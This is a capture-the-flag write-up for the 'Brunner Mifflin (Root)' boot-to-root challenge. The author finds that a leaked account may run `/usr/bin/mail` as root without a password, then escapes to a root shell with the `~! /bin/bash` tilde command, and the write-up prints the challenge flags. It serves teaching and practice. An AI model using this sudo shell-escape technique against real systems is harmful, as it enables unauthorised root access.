# Brunner Mifflin (Root)

**Author**: carax49<br>
**Date**: 2026-08-23

## Overview

- Category: Boot2Root
- Description:

```text
Now that you have access to the internal system, please help investigate the rumours regarding company-wide email surveillance being used to spy on all employees.

Perhaps you can turn it against them?

NOTE: You need to solve Brunner Mifflin (User) first.
```

## Analysis

After completing the challenge `Brunner Mifflin (User)`, I got

```text
To setup e-mail survailance I connect through the IT web terminal at /terminal with my username: itguy and my password: itguy321 <br /> brunner{1tGuyW111F1x}
```

From here, I can extract the following important information:

```text
Endpoint: /terminal
Credential: itguy:itguy321
```

## Solution

Access the endpoint `/terminal` and log in with the credential `itguy:itguy321`

<img src=./images/image-4.png style="border-radius: 3px;">

In front of me is a terminal interface where I can run commands, so I ran a few basic commands

Command
```bash
whoami
```
Output
```bash
itguy
```

Command
```bash
pwd
```
Output
```bash
/home/itguy
```

Command
```bash
ls /root
```
Output
```bash
ls: cannot open directory '/root': Permission denied
```

Command
```bash
sudo -l
```
Output
```text
Matching Defaults entries for itguy on
    d-brunner-mifflin-user-11474fbfffdb64f9-global-75b4559fc8-6gk99:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User itguy may run the following commands on
        d-brunner-mifflin-user-11474fbfffdb64f9-global-75b4559fc8-6gk99:
    (root) NOPASSWD: /usr/bin/mail
```

As shown above, I can run `/usr/bin/mail` with `sudo` privileges

Command
```bash
sudo /usr/bin/mail
```

Output
```text
No mail for root
```

After looking into the `mail` command's features on Linux, I found that while composing a message, you can execute commands using a `tilde escape` ([link](https://manpages.ubuntu.com/manpages/focal/man1/bsd-mailx.1.html))

```text
~! command
Execute the indicated shell command, then return to the message.
```

So I tried composing a mail to a fake email address `ahihi@ahihi.com`

```bash
sudo /usr/bin/mail ahihi@ahihi.com
```

And it worked! I entered any `Cc` and `Subject`, and for the message body, I entered

```bash
~! /bin/bash 
```

<img src=./images/image-5.png style="border-radius: 3px;">

This way, I was able to execute commands with `root` privileges

```bash
cat /root/flag.txt
```

## Flag

```text
brunner{1tguy_t4k35_m41l_s3cur1ty_v3ry_53r10u5}
```